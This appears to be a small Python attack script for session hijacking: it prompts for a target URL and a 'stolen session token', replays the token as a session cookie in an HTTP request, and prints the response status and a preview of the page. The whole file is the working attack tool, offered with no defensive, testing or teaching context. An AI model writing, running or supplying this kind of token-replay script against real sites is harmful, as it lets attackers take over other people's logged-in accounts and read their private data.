import requests

def replay_token(session_cookie, target_url):
    headers = {
        'Cookie': f'session={session_cookie}'
    }
    response = requests.get(target_url, headers=headers)
    return response.status_code, response.text

if __name__ == "__main__":
    target = input("Enter target URL: ")
    session = input("Enter stolen session token: ")
    status, content = replay_token(session, target)
    print(f"[+] Response code: {status}")
    print(f"[+] Preview:\n{content[:500]}")
